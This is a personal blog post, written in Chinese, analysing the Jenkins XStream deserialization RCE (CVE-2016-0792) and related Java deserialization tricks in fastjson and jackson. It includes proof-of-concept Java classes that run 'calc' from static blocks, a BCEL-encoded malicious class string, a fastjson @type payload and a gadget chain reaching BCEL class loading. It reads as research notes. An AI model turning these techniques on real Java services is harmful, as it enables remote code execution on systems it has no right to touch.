<!DOCTYPE html>
<html lang="en">
  <head>
    
<meta charset="UTF-8"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge" />
<meta name="viewport" content="width=device-width,user-scalable=no,initial-scale=1,minimum-scale=1,maximum-scale=1">


<meta http-equiv="Cache-Control" content="no-transform" />
<meta http-equiv="Cache-Control" content="no-siteapp" />



  <meta name="description" content="jenkins-2.101-XStream rce分析"/>




  <meta name="keywords" content="java," />





  <link rel="alternate" href="/default" title="glotozz'blog">




  <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=1.1" />



<link rel="canonical" href="https://glotozz.github.io/2020/04/18/jenkins-2-101-XStream-rce分析/"/>


<meta property="og:type" content="article">
<meta property="og:title" content="jenkins-2.101-XStream rce分析">
<meta property="og:url" content="https://glotozz.github.io/2020/04/18/jenkins-2-101-XStream-rce%E5%88%86%E6%9E%90/index.html">
<meta property="og:site_name" content="glotozz&#39;blog">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://i.loli.net/2020/04/19/5RGxLTXiNF4hkos.png">
<meta property="og:image" content="https://i.loli.net/2020/04/19/M3aN5p6QKGP9hOX.png">
<meta property="og:image" content="https://i.loli.net/2020/04/19/1vphenwStNW4XzV.png">
<meta property="og:image" content="https://i.loli.net/2020/04/19/K6QVp74nCZxGNWO.png">
<meta property="og:image" content="https://i.loli.net/2020/04/19/356M9xiGlXQaoKI.png">
<meta property="og:image" content="https://i.loli.net/2020/04/19/s2SB1ur4IEp7YUz.png">
<meta property="article:published_time" content="2020-04-18T11:30:02.000Z">
<meta property="article:modified_time" content="2020-04-20T09:44:01.064Z">
<meta property="article:author" content="glotozz">
<meta property="article:tag" content="java">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://i.loli.net/2020/04/19/5RGxLTXiNF4hkos.png">


<link rel="stylesheet" type="text/css" href="/css/style.css?v=1.1" />
<link href='https://fonts.googleapis.com/css?family=Open+Sans' rel='stylesheet'>





<script type="text/javascript">
  var themeConfig = {
    fancybox: {
      enable: false
    },
  };
</script>




  


<!--<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=0 height=0 src="https://music.163.com/song/media/outer/url?id=28592088.mp3"></iframe>--!>
<!--<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=0 height=0 src="/57a2_fa12_13ff_c310c1889d0f14b24334ad7afef6b9b1.mp3"></iframe>--!>
<!--<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=0 height=0 src="https://music.163.com/outchain/player?type=2&id=574288806&auto=0&height=66"></iframe>--!>
    <title> jenkins-2.101-XStream rce分析 - glotozz'blog </title>
  <meta name="generator" content="Hexo 4.2.0"></head>

  <body>
    <div id="page">
      <header id="masthead"><div class="site-header-inner">
    <h1 class="site-title">
        <a href="/." class="logo">glotozz'blog</a>
    </h1>

    <nav id="nav-top">
        
            <ul id="menu-top" class="nav-top-items">
                
                    <li class="menu-item">
                        <a href="/archives">
                            
                            
                                Archives
                            
                        </a>
                    </li>
                
                    <li class="menu-item">
                        <a href="/about">
                            
                            
                                About
                            
                        </a>
                    </li>
                
                    <li class="menu-item">
                        <a href="/read">
                            
                            
                                Read
                            
                        </a>
                    </li>
                
                    <li class="menu-item">
                        <a href="/stars">
                            
                            
                                Stars
                            
                        </a>
                    </li>
                
            </ul>
        
  </nav>
</div>

      </header>
      <div id="content">
        
    <div id="primary">
        
  <article class="post">
    <header class="post-header">
      <h1 class="post-title">
        
          jenkins-2.101-XStream rce分析
        
      </h1>

      <time class="post-time">
          Apr 18 2020
      </time>
    </header>



    
            <div class="post-content">
            <meta name="referrer" content="no-referrer">
<a id="more"></a>

<p> &nbsp;  &nbsp; &nbsp;&nbsp;&nbsp;<strong>简陋的目录</strong></p>
<!-- toc -->

<ul>
<li><a href="#jenkins反序列化漏洞cve-2016-0792">Jenkins反序列化漏洞（CVE-2016-0792）</a></li>
<li><a href="#defineclass在java反序列化当中的利用">DefineClass在Java反序列化当中的利用</a><ul>
<li><a href="#defineclass无文件注入">defineCLass()无文件注入</a></li>
<li><a href="#fastjson利用">fastjson利用</a></li>
<li><a href="#jackson利用">jackson利用</a></li>
</ul>
</li>
<li><a href="#hashmap-的利用">HashMap 的利用</a></li>
<li><a href="#触发链">触发链</a></li>
<li><a href="#参考链接">参考链接</a></li>
</ul>
<!-- tocstop -->

<hr>
<h3><span id="jenkins反序列化漏洞cve-2016-0792">Jenkins反序列化漏洞（CVE-2016-0792）</span></h3><blockquote>
<p><a href="https://www.freebuf.com/vuls/97659.html" target="_blank" rel="noopener">https://www.freebuf.com/vuls/97659.html</a> </p>
</blockquote>
<p>poc</p>
<p><img src="https://i.loli.net/2020/04/19/5RGxLTXiNF4hkos.png" alt="Snipaste_2020-04-19_20-03-55.png"></p>
<h3><span id="defineclass在java反序列化当中的利用">DefineClass在Java反序列化当中的利用</span></h3><p>根据官方文档，<code>defineClass()</code>可以从<code>byte[]</code>还原出一个Class对象。</p>
<h4><span id="defineclass无文件注入">defineCLass()无文件注入</span></h4><p><strong>常规思路需要文件</strong></p>
<p>一般需要通过<code>URLLoader()</code>去加载一个<code>.class</code>或是<code>.java</code>，然后调用<code>loadClass()</code>去加载类名，最后<code>newInstance()</code>实例出一个对象，调用方法抛出异常带出结果。</p>
<blockquote>
<p>构造恶意类的几种方式：</p>
<ol>
<li>利用静态代码块，在类的加载环节之一[初始化]时触发（重点）—触发方法<code>Class.forName()</code></li>
<li>利用构造函数，在类实例化时触发（当然，实例化前必然先初始化）—触发方法<code>newInstance()</code>， <code>new Evil()</code></li>
<li>利用自定义函数，在函数被调用时触发 — 触发方法 <code>xxx.fun()</code>、 <code>m.invoke()</code></li>
<li>利用接口的重写方法，在函数调用时触发</li>
</ol>
</blockquote>
<p>demo</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.net.MalformedURLException;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.net.URLClassLoader;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test2</span> </span>&#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">"calc"</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IllegalAccessException, InstantiationException, InvocationTargetException, ClassNotFoundException, NoSuchMethodException, MalformedURLException </span>&#123;</span><br><span class="line">        URLClassLoader cls = <span class="keyword">new</span> URLClassLoader(<span class="keyword">new</span> URL[]&#123;<span class="keyword">new</span> URL(<span class="string">"file:/F:/IdeaProjects/deserialize-study/out/artifacts/Test2/Test2.jar"</span>)&#125;);</span><br><span class="line">        Class cl = cls.loadClass(<span class="string">"Test2"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>defineClass()</strong></p>
<p>这里我们使用<code>org.mozilla.classfile.DefiningClassLoader类</code></p>
<p><img src="https://i.loli.net/2020/04/19/M3aN5p6QKGP9hOX.png" alt="Snipaste_2020-04-19_12-15-33.png"></p>
<p>demo</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> javassist.*;</span><br><span class="line"><span class="keyword">import</span> org.mozilla.classfile.DefiningClassLoader;</span><br><span class="line"><span class="keyword">import</span> sun.misc.BASE64Decoder;</span><br><span class="line"><span class="keyword">import</span> sun.misc.BASE64Encoder;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.util.Arrays;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test3</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, CannotCompileException, NotFoundException </span>&#123;</span><br><span class="line">        Test2 test2 = <span class="keyword">new</span> Test2();</span><br><span class="line">        <span class="comment">//获取默认类池</span></span><br><span class="line">        ClassPool pool = ClassPool.getDefault();</span><br><span class="line">        <span class="comment">//加入我们的恶意类</span></span><br><span class="line">        pool.insertClassPath(<span class="keyword">new</span> ClassClassPath(Test2.class));</span><br><span class="line">        <span class="comment">//获取pool中的EvalClass</span></span><br><span class="line">        CtClass pay = pool.get(Test2.class.getName());</span><br><span class="line">        <span class="comment">//获取Eval类的字节码</span></span><br><span class="line">        <span class="keyword">byte</span>[] bt = pay.toBytecode();</span><br><span class="line"><span class="comment">//        BASE64Encoder encoder = new BASE64Encoder();</span></span><br><span class="line"><span class="comment">//        System.out.println(encoder.encode(bt));</span></span><br><span class="line">        DefiningClassLoader cls = <span class="keyword">new</span> DefiningClassLoader();</span><br><span class="line">        Class cl = cls.defineClass(<span class="string">"Test2"</span>, bt);</span><br><span class="line"></span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4><span id="fastjson利用">fastjson利用</span></h4><p>基于<code>ClassLoader</code>的利用方式</p>
<p>一、通过<code>@type</code>“特性”，就执行了构造函数以及私有和公有成员变量的<code>getter</code>和<code>setter</code>方法。 </p>
<p>二、tomcat有一个<code>tomcat-dbcp.jar</code>组件是tomcat用来连接数据库的驱动程序，其中<code>org.apache.tomcat.dbcp.dbcp.BasicDataSource类</code>中有<code>Class.forName()</code>方法。</p>
<p>三、当Fastjson反序列化<code>org.apache.tomcat.dbcp.dbcp.BasicDataSource</code>对象时，首先通过<code>setter</code>方法设置其<code>driverClassLoader和driverClassName</code>属性，然后会调用其<code>getConnection</code>方法，又最终调用了<code>createConnectionFactory</code>方法，其通过<code>Class.forName</code>方法用<code>driverClassLoader</code>加载<code>driverClassName</code>，并设置是否初始化参数为<code>true</code>。 </p>
<p>demo</p>
<p><code>eval.json</code></p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">"@type"</span>: <span class="string">"Test2"</span>,</span><br><span class="line">  <span class="attr">"name"</span>: <span class="string">"gqy"</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>Test2.java</code></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.classfile.Utility;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Path;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test2</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> String name;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">"calc"</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"ok"</span>);</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setName</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String []args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        <span class="comment">//There also should be compiled class file,not java file</span></span><br><span class="line">        Path path = Paths.get(<span class="string">"target/classes/Test2.class"</span>);</span><br><span class="line">        <span class="keyword">byte</span>[] data = Files.readAllBytes(path);</span><br><span class="line">        <span class="comment">//BCEL编码</span></span><br><span class="line">        String s =  Utility.encode(data,<span class="keyword">true</span>);</span><br><span class="line">        System.out.print(s);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>Test4.java</code></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test4</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">readToBuffer</span><span class="params">(StringBuffer buffer, String filePath)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        InputStream is = <span class="keyword">new</span> FileInputStream(filePath);</span><br><span class="line">        String line; <span class="comment">// 用来保存每行读取的内容</span></span><br><span class="line">        BufferedReader reader = <span class="keyword">new</span> BufferedReader(<span class="keyword">new</span> InputStreamReader(is));</span><br><span class="line">        line = reader.readLine(); <span class="comment">// 读取第一行</span></span><br><span class="line">        <span class="keyword">while</span> (line != <span class="keyword">null</span>) &#123; <span class="comment">// 如果 line 为空说明读完了</span></span><br><span class="line">            buffer.append(line); <span class="comment">// 将读到的内容添加到 buffer 中</span></span><br><span class="line">            buffer.append(<span class="string">"\n"</span>); <span class="comment">// 添加换行符</span></span><br><span class="line">            line = reader.readLine(); <span class="comment">// 读取下一行</span></span><br><span class="line">        &#125;</span><br><span class="line">        reader.close();</span><br><span class="line">        is.close();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException, IOException </span>&#123;</span><br><span class="line">        <span class="comment">//fastjson version 1.2.24</span></span><br><span class="line"></span><br><span class="line">		<span class="comment">//直接调用Class.forName()</span></span><br><span class="line"><span class="comment">//        String classname = "org.apache.log4j.spi$$BCEL$$$l$8b$I$A$A$A$A$A$A$AmTkS$d3$40$U$3d$db$W$d2$c6$60$a1$a5$80$I$w$be$u$e5$RE$7c$W$l$80$a0H$81J$Bg$e4$d3$SV$I$a6I$t$d9$3a$f0$8b$fc$8c$l$b0$e3$8c$fe$A$7f$94$e3$dd$94G$d1t$a6$bb$bdg$ef9$7b$ee$dd$3b$fd$fd$e7$c7$_$AS$d8$d0$91F$n$89Q$Nc$3a$c61$a1$c3$c4$3d$j$f71$99$c2$DL$e9x$88G$3a$k$e3I$SO$d5$feLCQ$87$81i$N$cf5$bc$60h$9f$b6$5d$5b$d2$8fx$7ed$93$n1$e7$ed$I$86t$c9v$c5J$bd$ba$z$fcu$be$ed$Q$92$vy$Ww6$b9o$ab$f8$EL$c8$3d$3b$60$d0J$eb$o$90$93E$C$aa$dcv$Zz$f2$5b$a5$7d$fe$85$9b$Oww$cd$8a$f4mw$b7$Y$cas$7f$97$I$d9$88c$3a$acq$b9$c7$d0$dd$3csm$cf$fcd$3b$c2$y$T$aaNw$b8$e4$M$b1$adY$G$W$uC$R$S$fa$fc$81$rj$d2$f6$dc$40$c3K$86$e4$b4$e5$9c$d4$c7$c8o$ae$c9$n$e5$c5$d5$b3L$a2uT$q$b7$3e$_$f3ZX$X$b5$88$94$w$5e$dd$b7$c4$82$ad$ea$d4$c3$fa$s$U$d9$40$t$ba$Y$fa$rU$o$a4i9$3c$ID$606$T$c2$88$a1$f3_g$g$5e$Z$98$c1$ac$869$D$af1$afa$c1$c0$h$bc$d5$b0h$e0$j$964$94$M$ycE$c3$aa$812$deS$b5$d4l$cb$c0$g$w$d4$ad$I$d3$G$d6$95$8d$b6$f0$de$L7$aen$ef$LK$9e$b2B$e8$8cu$8a$5e$e8$z$Z$8eS$v$M$c5$fc$ff$z$8dz$c7$e8$f7$f9GY5$8e$94$N_$f0$9d$Z$c7$99$3d$94$w$ec$cbG$91G$d4$9bNZ$5e$d5$M$ea$ae$e9$f9$bb$s$afqkO$98$db$96pL$db$95$c2w$b9$d3$ecu$c8$da$90$b6c$cbC$9a$5e$e1Z$e1$c0$f6$e6$b7f$3f$8eD$8dD$ebc$i$GRT$a9$5c$af$$$5b$87$a1L$a9$92$I$82W$8b$z$edn$81$a9$d35$V$R$x$a2Ij$b2$bb$ce$d1$b5$ba$x$ed$aa$g$hj$ebY$90$cb$b7$da$3b$81$d5$5c$8b$Da1$MG$e9$b6$40e$df$b3D$Q$Q$n$5dk$fa$a2$89$5d$f7$b9$r0$84$cb$f4$_$a0$3eq05$9e$b4f$u2ig$b4$b7$V$be$83$j$d1$8f$Y$b2$b4$b6$87$60$g$dd$b4$g$cd$E$e4$d0C$7b$K$bd$e8$a3$yE$ae$d3$9e$a0$7d0$T$8b$ffD$bc$81Di$b4$81$b6$e5$b1D$D$ed$x$df$a0$8d$l$py$$$daC$o$40$3ft$5c$r$e9$B$S$i$a4$f5ZxI$a1$v$84$xt$O$ca$c8R$ce$A$5d$9c$s$df$83$94$T$a3$ec$q$ae$e3$G$f9$l$a2$8c$E$9d$dd$q$e4$d6Y$r$9cr$94$d1L$D$a9$8c$7e$8cK$l$be$o$b9T8F$c7Q$88$a7$a8$Q$83$d8$e7N2$84$e5$I$cb$a2$83$3ct$RzZn$H$e9$df$c6$j$8a$ee$d2WC$ac$a4aX$5d$99$P$8b$Z$f9$L$c0$LA$q$5c$F$A$A";</span></span><br><span class="line"><span class="comment">//        ClassLoader cls = new com.sun.org.apache.bcel.internal.util.ClassLoader();</span></span><br><span class="line"><span class="comment">//        Class.forName(classname, true, cls);</span></span><br><span class="line"></span><br><span class="line">  		<span class="comment">//读取json文件触发漏洞</span></span><br><span class="line">        StringBuffer Buffer = <span class="keyword">new</span> StringBuffer();</span><br><span class="line">        Test4.readToBuffer(Buffer,<span class="string">"src/main/java/eval.json"</span>);</span><br><span class="line">        Object obj= JSON.parseObject(Buffer.toString());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>进一步利用，根据上面分析的</p>
<p><img src="https://i.loli.net/2020/04/19/1vphenwStNW4XzV.png" alt="Snipaste_2020-04-19_14-55-34.png"></p>
<p>但是测试没成功（没报错。。）</p>
<h4><span id="jackson利用">jackson利用</span></h4><p>jackson类似fastjson可以通过<code>type</code>属性，设置变量的值，但是不同的是jackson默认不开启<code>type</code>，需要<code>mapper.enableDefaultTyping()</code>设置开启。</p>
<p>demo</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.databind.ObjectMapper;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test4</span> </span>&#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">"calc"</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">readToBuffer</span><span class="params">(StringBuffer buffer, String filePath)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        InputStream is = <span class="keyword">new</span> FileInputStream(filePath);</span><br><span class="line">        String line; <span class="comment">// 用来保存每行读取的内容</span></span><br><span class="line">        BufferedReader reader = <span class="keyword">new</span> BufferedReader(<span class="keyword">new</span> InputStreamReader(is));</span><br><span class="line">        line = reader.readLine(); <span class="comment">// 读取第一行</span></span><br><span class="line">        <span class="keyword">while</span> (line != <span class="keyword">null</span>) &#123; <span class="comment">// 如果 line 为空说明读完了</span></span><br><span class="line">            buffer.append(line); <span class="comment">// 将读到的内容添加到 buffer 中</span></span><br><span class="line">            buffer.append(<span class="string">"\n"</span>); <span class="comment">// 添加换行符</span></span><br><span class="line">            line = reader.readLine(); <span class="comment">// 读取下一行</span></span><br><span class="line">        &#125;</span><br><span class="line">        reader.close();</span><br><span class="line">        is.close();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line"></span><br><span class="line">        StringBuffer Buffer = <span class="keyword">new</span> StringBuffer();</span><br><span class="line">        Test4.readToBuffer(Buffer,<span class="string">"src/main/java/eval.json"</span>);</span><br><span class="line">        ObjectMapper objectMapper = <span class="keyword">new</span> ObjectMapper();</span><br><span class="line">        objectMapper.enableDefaultTyping();</span><br><span class="line">        objectMapper.readValue(Buffer.toString(), Test4.class);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<hr>
<h3><span id="hashmap-的利用">HashMap 的利用</span></h3><p>总结下，<code>map</code>结构存储的时候，对各个键值对进行 key 的一个比较，而在调用<code>equals()</code>的时候还会调用key的<code>hashCode()</code>以及<code>toString()</code>，并且不止一次调用</p>
<h3><span id="触发链">触发链</span></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">jdk.nashorn.internal.objects.NativeString#hashCode</span><br><span class="line">-&gt;</span><br><span class="line">com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data#toString</span><br><span class="line">-&gt;</span><br><span class="line">javax.crypto.CipherInputStream#read</span><br><span class="line">-&gt;</span><br><span class="line">javax.crypto.Cipher#chooseFirstProvider</span><br><span class="line">-&gt;</span><br><span class="line">com.sun.xml.internal.ws.util.ServiceFinder$LazyIterator#next</span><br><span class="line">-&gt;</span><br><span class="line">Java.lang.Class#forName</span><br><span class="line">-&gt;</span><br><span class="line">com.sun.org.apache.bcel.internal.util.ClassLoader#loadClass</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2020/04/19/K6QVp74nCZxGNWO.png" alt="Snipaste_2020-04-19_17-56-44.png"></p>
<p><code>com.sun.xml.internal.ws.util.ServiceFinder</code></p>
<p><img src="https://i.loli.net/2020/04/19/356M9xiGlXQaoKI.png" alt="Snipaste_2020-04-19_17-03-06.png"></p>
<p>跟进<code>sn</code></p>
<p><img src="https://i.loli.net/2020/04/19/s2SB1ur4IEp7YUz.png" alt="Snipaste_2020-04-19_17-10-13.png"></p>
<p>POC还没写出来</p>
<h3><span id="参考链接">参考链接</span></h3><p> <a href="https://www.anquanke.com/post/id/172198?from=singlemessage" target="_blank" rel="noopener">https://www.anquanke.com/post/id/172198?from=singlemessage</a> </p>
<p> <a href="https://www.freebuf.com/articles/others-articles/167932.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/others-articles/167932.html</a> </p>
<p> <a href="https://www.colabug.com/2018/0618/3197569/" target="_blank" rel="noopener">https://www.colabug.com/2018/0618/3197569/</a></p>

            </div>
          

    
      <footer class="post-footer">

        
         <div>    
          
          <ul class="post-copyright">
             <li class="post-copyright-link">
              <strong>本文作者：</strong>
              <a href="/" title="欢迎访问 glotozz 的个人博客">glotozz</a>
            </li>

            <li class="post-copyright-license">
              <strong>版权声明： </strong>
               本博客所有文章除特别声明外，均采用 CC BY-NC-SA 4.0 许可协议。转载请注明出处！
            </li>
          </ul>
        
      </div>
      
        <div class="post-tags">
          
            <a href="/tags/java/" rel="tag"><i class="fa fa-tag"></i> java</a>
          
        </div>
      

        
        
  <nav class="post-nav">
    
      <a class="prev" href="/2020/04/19/HFCTF-wp/">
        <i class="iconfont icon-left"></i>
        <span class="prev-text nav-default">HFCTF-wp</span>
        <span class="prev-text nav-mobile">Prev</span>
      </a>
    
    
      <a class="next" href="/2020/04/18/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%8E%9F%E7%90%86/">
        <span class="next-text nav-default">java反序列化原理</span>
        <span class="prev-text nav-mobile">Next</span>
        <i class="iconfont icon-right"></i>
      </a>
    
  </nav>

        
  <div class="comments" id="comments">
    
      <div id="vcomments"></div>
    
  </div>


      </footer>
    
  </article>

    </div>

      </div>

      <footer id="colophon">
<span class="copyright-year">
    
        &copy;
    
    2020
    <span class="footer-author">glotozz.</span>
    <span class="power-by">
        Powered by <a class="hexo-link" href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a> and <a class="theme-link" href="https://github.com/frostfan/hexo-theme-polarbear" target="_blank" rel="noopener">Polar Bear</a>
    </span>
</span>

      </footer>

      <div class="back-to-top" id="back-to-top">
        <i class="iconfont icon-up"></i>
      </div>
    </div>
    



  
<!-- valine Comments -->
